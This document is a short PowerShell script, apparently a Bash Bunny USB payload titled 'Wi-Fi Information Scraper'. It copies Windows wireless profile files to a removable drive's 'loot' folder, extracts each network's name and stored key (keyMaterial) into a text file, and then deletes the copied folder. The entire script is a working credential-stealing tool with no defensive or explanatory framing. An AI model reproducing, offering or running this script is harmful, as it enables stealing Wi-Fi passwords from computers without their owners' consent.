#Wi-Fi Information Scraper
cd "~";
$tDate = Get-Date -Format "MM-dd-yyyy";
$vol = Get-Volume -FileSystemLabel BashBunny;
$baseDir = $vol.DriveLetter + ":/loot/WiFi-Hash-Scraper/" + $tDate;
$interfaceDir = $baseDir + "/Interfaces";
$oFile = $baseDir + "/WiFi-Info.txt";
Copy-Item "C:/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces" "$interfaceDir" -R -Force;
cd $interfaceDir;
$temp = Get-ChildItem | Select-String "{";
$interfaces = $temp -split "[Environment]::NewLine";
foreach($iface in $interfaces){
    cd $iface;
    $ftemp = Get-ChildItem;
    $files = $ftemp -split "[Environment]::NewLine";
    foreach($sNet in $files){
        $temp = cat "$sNet" | Select-String "name";$temp += "";$temp += cat $sNet | Select-String "keyMaterial";echo $temp | Out-File $oFile -Append
    }
    cd ../;
}
cd "~";
Remove-Item $interfaceDir -R;